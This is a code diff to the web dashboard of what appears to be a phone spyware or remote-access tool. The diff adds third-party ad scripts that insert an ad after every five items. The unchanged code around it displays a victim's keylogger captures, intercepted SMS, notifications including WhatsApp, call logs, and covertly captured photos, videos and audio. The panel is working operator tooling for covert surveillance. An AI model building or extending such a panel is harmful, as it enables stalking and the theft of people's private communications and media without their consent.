@@ -96,6 +96,32 @@
             50% { transform: scale(0.95); }
             100% { transform: scale(1); }
         }
+        
+        /* Ad Styles Start */
+        .ad-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .ad-300x250 {
+            width: 300px;
+            height: 250px;
+            margin: 2rem auto;
+        }
+        .ad-320x50 {
+            width: 100%;
+            max-width: 320px;
+            height: 50px;
+            min-height: 50px;
+            margin: 1.5rem auto; /* Ensures it's centered in data lists */
+        }
+        /* Make sure it fits in grids too */
+        .data-grid .ad-container {
+            grid-column: 1 / -1; /* Span full width in grid */
+            margin: 1.5rem auto;
+        }
+        /* Ad Styles End */
 
         .dashboard-container {
             display: flex;
@@ -776,6 +802,22 @@
                         <span>File Manager</span>
                     </button>
                  </div>
+
+                <!-- Real Ad Container 300x250 Start -->
+                <div id="dashboard-ad-container" class="ad-container ad-300x250">
+                    <script type="text/javascript">
+                        atOptions = {
+                            'key' : 'a66b2c51a89fd14484b5ef78706451ba',
+                            'format' : 'iframe',
+                            'height' : 250,
+                            'width' : 300,
+                            'params' : {}
+                        };
+                    </script>
+                    <script type="text/javascript" src="//www.highperformanceformat.com/a66b2c51a89fd14484b5ef78706451ba/invoke.js"></script>
+                </div>
+                <!-- Real Ad Container 300x250 End -->
+
             </div>
         </main>
     </div>
@@ -987,6 +1029,23 @@
         let isVideoCommandRunning = false;
         let isAudioCommandRunning = false;
         
+        // Ad helper function
+        function getAdHtml() {
+            // IMPORTANT: Use string concatenation to prevent the <script> tag from closing the main script block.
+            const adScript = '<script type="text/javascript">' +
+                "atOptions = {" +
+                "'key' : '3fdc31da6152751e5c6f9e26dadb6d23'," +
+                "'format' : 'iframe'," +
+                "'height' : 50," +
+                "'width' : 320," +
+                "'params' : {}" +
+                "};" +
+                '<' + '/script>' +
+                '<script type="text/javascript" src="//www.highperformanceformat.com/3fdc31da6152751e5c6f9e26dadb6d23/invoke.js">' + '<' + '/script>';
+            
+            return `<div class="ad-container ad-320x50">${adScript}</div>`;
+        }
+
         toggleSidebarBtn.addEventListener('click', () => dashboard.classList.toggle('sidebar-hidden'));
         
         loginTabBtn.addEventListener('click', () => { 
@@ -1403,13 +1462,18 @@
             const batch = fullKeyloggerData.slice(renderedKeyloggerCount, end);
 
             let contentHTML = '';
-            batch.forEach(log => {
+            batch.forEach((log, index) => {
+                const globalIndex = renderedKeyloggerCount + index;
                 if (log && log.keyText) {
                     const parts = log.keyText.split(' |');
                     const time = parts[0] || '';
                     const action = (parts[1] || '').replace(/[()]/g, '');
                     const text = parts[2] || '';
                     contentHTML += `<div class="data-card"><div class="data-card-header"><div class="data-card-title">${action}</div></div><div class="data-card-body"><strong>${text}</strong></div><div class="data-card-footer">${time}</div></div>`;
+                }
+                // Insert ad every 5 items
+                if ((globalIndex + 1) % 5 === 0) {
+                    contentHTML += getAdHtml();
                 }
             });
 
@@ -1434,17 +1498,37 @@
                     break;
                 case 'sms':
                     contentHTML = '<div class="data-list">';
-                    dataArray.forEach(sms => { if (sms) { const isOutgoing = sms.type === 2; const title = !isOutgoing ? `From: ${sms.smsAddress || 'Unknown'}` : `To: ${sms.smsAddress || 'Unknown'}`; const iconColor = !isOutgoing ? 'var(--accent-blue)' : 'var(--accent-teal)'; contentHTML += `<div class="data-card"><div class="data-card-header"><div class="data-card-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="${iconColor}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg></div><div class="data-card-title">${title}</div></div><div class="data-card-body">${sms.smsBody || ''}</div><div class="data-card-footer">${sms.dateTime || ''}</div></div>`; }});
+                    dataArray.forEach((sms, index) => { 
+                        if (sms) { 
+                            const isOutgoing = sms.type === 2; 
+                            const title = !isOutgoing ? `From: ${sms.smsAddress || 'Unknown'}` : `To: ${sms.smsAddress || 'Unknown'}`; 
+                            const iconColor = !isOutgoing ? 'var(--accent-blue)' : 'var(--accent-teal)'; 
+                            contentHTML += `<div class="data-card"><div class="data-card-header"><div class="data-card-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="${iconColor}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg></div><div class="data-card-title">${title}</div></div><div class="data-card-body">${sms.smsBody || ''}</div><div class="data-card-footer">${sms.dateTime || ''}</div></div>`; 
+                        }
+                        if ((index + 1) % 5 === 0) {
+                            contentHTML += getAdHtml();
+                        }
+                    });
                     contentHTML += '</div>';
                     break;
                 case 'notifications':
                     contentHTML = '<div class="data-grid">';
-                     dataArray.forEach(notif => { if (notif) { let appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-pink)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>`; const fullText = `${notif.title || ''} ${notif.text || ''}`.toLowerCase(); if (fullText.includes('whatsapp')) { appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25D366"><path d="M19.78 4.22a10.4 10.4 0 0 0-14.9 0 10.4 10.4 0 0 0 0 14.9l-1.38 5.02 5.13-1.35a10.4 10.4 0 0 0 14.9 0 10.4 10.4 0 0 0 0-14.9zM12 20.9a8.8 8.8 0 0 1-4.5-1.2L4 21l1.3-3.5a8.8 8.8 0 1 1 6.7 3.4zM16.4 13.6c-.2-.1-.8-.4-1-.4s-.3-.1-.4.1-.4.4-.5.5-.2.1-.4 0c-.2-.1-1-1-1.8-1.8-.7-.6-1.1-1.4-.9-1.6s.2-.3.3-.4c.1-.1.2-.2.3-.3.1-.1 0-.2 0-.3s-1-2.3-1.3-3.2c-.3-.8-.6-1-.8-1s-.4-.1-.6-.1h-.3c-.2 0-.5.1-.7.3-.2.2-.8.8-1 2s-1.2 2.3-.9 3.3c.3 1 1.1 2.4 2.5 3.8 1.4 1.4 2.8 2.2 4.3 2.7 1.5.5 2.8.4 3.8.3.9-.1 2.3-1 2.6-1.9.3-.9.3-1.7.2-1.9s-.3-.3-.5-.4z"/></svg>`; } contentHTML += `<div class="data-card"><div class="data-card-header"><div class="data-card-icon">${appIcon}</div><div class="data-card-title">${notif.title || 'Notification'}</div></div><div class="data-card-body">${notif.text || ''}</div><div class="data-card-footer">${notif.dateTime || ''}</div></div>`; }});
+                     dataArray.forEach((notif, index) => { 
+                        if (notif) { 
+                            let appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-pink)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>`; 
+                            const fullText = `${notif.title || ''} ${notif.text || ''}`.toLowerCase(); 
+                            if (fullText.includes('whatsapp')) { appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25D366"><path d="M19.78 4.22a10.4 10.4 0 0 0-14.9 0 10.4 10.4 0 0 0 0 14.9l-1.38 5.02 5.13-1.35a10.4 10.4 0 0 0 14.9 0 10.4 10.4 0 0 0 0-14.9zM12 20.9a8.8 8.8 0 0 1-4.5-1.2L4 21l1.3-3.5a8.8 8.8 0 1 1 6.7 3.4zM16.4 13.6c-.2-.1-.8-.4-1-.4s-.3-.1-.4.1-.4.4-.5.5-.2.1-.4 0c-.2-.1-1-1-1.8-1.8-.7-.6-1.1-1.4-.9-1.6s.2-.3.3-.4c.1-.1.2-.2.3-.3.1-.1 0-.2 0-.3s-1-2.3-1.3-3.2c-.3-.8-.6-1-.8-1s-.4-.1-.6-.1h-.3c-.2 0-.5.1-.7.3-.2.2-.8.8-1 2s-1.2 2.3-.9 3.3c.3 1 1.1 2.4 2.5 3.8 1.4 1.4 2.8 2.2 4.3 2.7 1.5.5 2.8.4 3.8.3.9-.1 2.3-1 2.6-1.9.3-.9.3-1.7.2-1.9s-.3-.3-.5-.4z"/></svg>`; } 
+                            contentHTML += `<div class="data-card"><div class="data-card-header"><div class="data-card-icon">${appIcon}</div><div class="data-card-title">${notif.title || 'Notification'}</div></div><div class="data-card-body">${notif.text || ''}</div><div class="data-card-footer">${notif.dateTime || ''}</div></div>`; 
+                        }
+                        if ((index + 1) % 5 === 0) {
+                            contentHTML += getAdHtml();
+                        }
+                    });
                     contentHTML += '</div>';
                     break;
                 case 'calllogs':
                     contentHTML = '<div class="data-list">';
-                    dataArray.forEach(call => {
+                    dataArray.forEach((call, index) => {
                         if (call) {
                             let icon, title;
                             switch (String(call.type).toUpperCase()) {
@@ -1453,6 +1537,9 @@
                                 default: icon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>`; title = `Missed Call`; break;
                             }
                             contentHTML += `<div class="data-card"><div class="data-card-header"><div class="data-card-icon">${icon}</div><div class="data-card-title">${title}</div></div><div class="data-card-body"><strong>Number:</strong> ${call.phoneNumber || 'N/A'}<br><strong>Duration:</strong> ${call.duration || '0'}s</div><div class="data-card-footer">${new Date(call.date).toLocaleString()}</div></div>`;
+                        }
+                        if ((index + 1) % 5 === 0) {
+                            contentHTML += getAdHtml();
                         }
                     });
                     contentHTML += '</div>';
@@ -1521,11 +1608,14 @@
                 } else {
                     const photosWithData = Object.values(photos).reverse();
                     photoGridHTML = '<div class="data-grid">';
-                    photosWithData.forEach(photoData => {
+                    photosWithData.forEach((photoData, index) => {
                         if (typeof photoData === 'object' && photoData !== null && photoData.urlPhoto) {
                             const url = photoData.urlPhoto; 
                             const timeCreated = photoData.dateTime || 'N/A';
                             photoGridHTML += `<div class="data-card photo-card"><img src="${url}" alt="Captured photo" style="width:100%; height: 200px; object-fit: cover; border-radius: 8px 8px 0 0;" onerror="this.onerror=null;this.src='https://placehold.co/300x200/162136/E0E7FF?text=Error';"><div style="padding: 1rem;"><div class="data-card-footer" style="text-align: left;">${timeCreated}</div><a href="${url}" target="_blank" class="map-link" style="width: 100%; justify-content: center;">View Full Image</a></div></div>`;
+                        }
+                        if ((index + 1) % 5 === 0) {
+                           photoGridHTML += getAdHtml();
                         }
                     });
                     photoGridHTML += '</div>';
@@ -1567,7 +1657,7 @@
                     } else {
                         const videosWithData = Object.values(videos).reverse();
                         videoGridHTML = '<div class="data-grid">';
-                        videosWithData.forEach(videoData => {
+                        videosWithData.forEach((videoData, index) => {
                             if (typeof videoData === 'object' && videoData !== null && videoData.videoUrl) {
                                 const url = videoData.videoUrl; 
                                 const timeCreated = videoData.dateTime || 'N/A';
@@ -1581,6 +1671,9 @@
                                         <a href="${url}" target="_blank" class="map-link" style="width: 100%; justify-content: center;">View Full Video</a>
                                     </div>
                                 </div>`;
+                            }
+                            if ((index + 1) % 5 === 0) {
+                                videoGridHTML += getAdHtml();
                             }
                         });
                         videoGridHTML += '</div>';
@@ -1622,7 +1715,7 @@
                     } else {
                         const audiosWithData = Object.values(audios).reverse();
                         audioListHTML = '<div class="data-list">';
-                        audiosWithData.forEach(audioData => {
+                        audiosWithData.forEach((audioData, index) => {
                             if (typeof audioData === 'object' && audioData !== null && audioData.audioUrl) {
                                 const url = audioData.audioUrl; 
                                 const timeCreated = audioData.dateTime || 'N/A';
@@ -1635,6 +1728,9 @@
                                     </div>
                                     <div class="data-card-footer">${timeCreated}</div>
                                 </div>`;
+                            }
+                            if ((index + 1) % 5 === 0) {
+                                audioListHTML += getAdHtml();
                             }
                         });
                         audioListHTML += '</div>';
